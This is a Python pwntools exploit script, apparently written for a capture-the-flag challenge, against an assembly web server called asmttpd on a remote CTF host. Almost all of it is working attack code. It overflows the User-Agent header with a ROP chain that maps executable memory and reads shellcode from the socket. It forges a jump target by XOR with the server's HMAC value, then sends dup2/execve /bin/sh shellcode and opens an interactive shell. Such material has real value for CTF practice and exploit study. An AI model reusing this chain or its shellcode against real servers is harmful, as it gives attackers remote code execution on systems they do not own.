#!/usr/bin/env python
# encoding: utf-8

from pwn import *

def p(string): print text.white_on_red("[*] " + string)

# binary: asmttpd_9f3927f2efa1978b45211a93afc9920bd03c425e90abcda268be41d96e6862fa
# r = remote('0', '6600') 

r = remote('slick.vuln.icec.tf', '6600')

request = ""
request += "GET / HTTP/1.0\n"
request += "User-Agent: "
request += "A" * 93

# mmap() chain:
# rax => syscall      0x09
# rdi => address      0x0000000013371337
# rsi => length       0x1000
# rdx => prot         0x07 PROT_EXEC | PROT_READ | PROT_WRITE
# r10 => flags        0x00000021 (ANONYMOUS | MAP_SHARED)
# r8 =>  fd           0xffffffff (-1)
# r9 =>  offset       0x00000000
# syscall
request += p64(0x0000000000400105) # pop r8 ; pop rcx ; pop rbx ; pop r9 ; pop r10 ; pop rdx ; pop rsi ; pop rdi ; ret
request += p64(0xffffffffffffffff) # r8
request += p64(0xcccccccccccccccc) # rcx
request += p64(0xcccccccccccccccc) # rbx
request += p64(0x0000000000000000) # r9
request += p64(0x0000000000000021) # r10
request += p64(0x0000000000000007) # rdx
request += p64(0x0000000000000009) # rsi
request += p64(0xcccccccccccccccc) # rdi

request += p64(0x0000000000400c9e) # mov eax, esi ; ret

request += p64(0x000000000040010e) # pop rsi ; pop rdi ; ret
request += p64(0x0000000000001000) # rsi
request += p64(0x0000000000200000) # rdi -> address

request += p64(0x0000000000400bf3) # syscall
# read() chain:
# rax => syscall      0x00
# rdi => fd           0x05
# rsi => buf          0x0000000000200000
# rdx => count        0x1000
# syscall
request += p64(0xcccccccccccccccc) # r8
request += p64(0xcccccccccccccccc) # rcx
request += p64(0xcccccccccccccccc) # rbx
request += p64(0xcccccccccccccccc) # r9
request += p64(0xcccccccccccccccc) # r10
request += p64(0xcccccccccccccccc) # rdx
request += p64(0x0000000000000000) # rsi
request += p64(0xcccccccccccccccc) # rdi

request += p64(0x0000000000400c9e) # mov eax, esi ; ret

request += p64(0x000000000040010d) # pop rdx; pop rsi ; pop rdi ; ret
request += p64(0x0000000000001000) # rdx
request += p64(0x0000000000200000) # rsi
request += p64(0x0000000000000005) # rdi - socket FD

request += p64(0x0000000000400bf3) # syscall
request += p64(0xcccccccccccccccc) # r8
request += p64(0xcccccccccccccccc) # rcx
request += p64(0xcccccccccccccccc) # rbx
request += p64(0xcccccccccccccccc) # r9
request += p64(0xcccccccccccccccc) # r10
request += p64(0xcccccccccccccccc) # rdx
request += p64(0x0000000000000000) # rsi
request += p64(0xcccccccccccccccc) # rdi

# Jump to the shellcode, read over socket
request += p64(0x0000000000200000)

request += "b" * (1000 - len(request))

"""
# request += p64(0x1337deadbeefcafe)
# 0x0000000000400ddc => add rsp, 0x80; ret

# strace -f ./asmttpd xx/ && killall -9 asmttpd; gdb ./asmttpd core -ex 'i r r13 rax' -ex 'p $r13^$rax' -ex 'x /i $rip'

Program terminated with signal SIGSEGV, Segmentation fault.
#0  worker_thread_continue () at main.asm:229
229     main.asm: No such file or directory.
r13            0xb49e4eef3700a97f       0xb49e4eef3700a97f
rax            0xa7a9904289ef6381       0xa7a9904289ef6381
$1 = 0x1337deadbeefcafe
=> 0x401044 <worker_thread_continue+52>:        jmp    r13

...
gdb-peda$ p $r13^0x1337deadbeefcafe^0x0000000000400ddc
$4 = 0x67b9cbf6e97f8099
"""
# This value is for r13, XORed with hmac()'s return value (rax) 
# xor r13, rax; jmp r13
request += p64(0x67b9cbf6e97f8099) 
request += "\n\n"

print 'size of request: ', len(request)
print(repr(request))

r.send(request)

# ./opcodes.sh dup2-execve
shellcode = "\x48\x31\xf6\x6a\x05\x5f\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x76\xef\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"

r.send(shellcode)

p("Spawning shell")
r.interactive()

"""
References:

https://filippo.io/linux-syscall-table/
https://blog.techorganic.com/2015/09/21/csaw-ctf-quals-2015-autobots-writeup/
https://codinguy.net/2013/09/30/execve-shellcode-64-bit/
"""
